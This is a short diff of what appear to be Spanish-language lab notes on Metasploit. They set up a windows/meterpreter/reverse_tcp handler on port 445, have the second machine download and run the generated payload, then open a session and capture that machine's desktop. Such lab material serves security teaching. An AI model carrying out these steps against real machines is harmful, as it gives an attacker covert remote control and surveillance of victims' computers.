@@ -6,5 +6,10 @@
 ++ PC1 use exploit/multi/handler
 ++ PC1 set playload windows/meterpreter/reverse_tcp
 ++ PC1 set lport 445
+++ PC1 set lhost <ip_local>
 ++ PC1 exploit
+++ PC2 descargar y ejecutar el archivo generado
+++ PC1 Se mostrará el mensaje de sesion abierta
+++ PC1 screenshot (Tomar captura del escritorio de PC2)
+
 
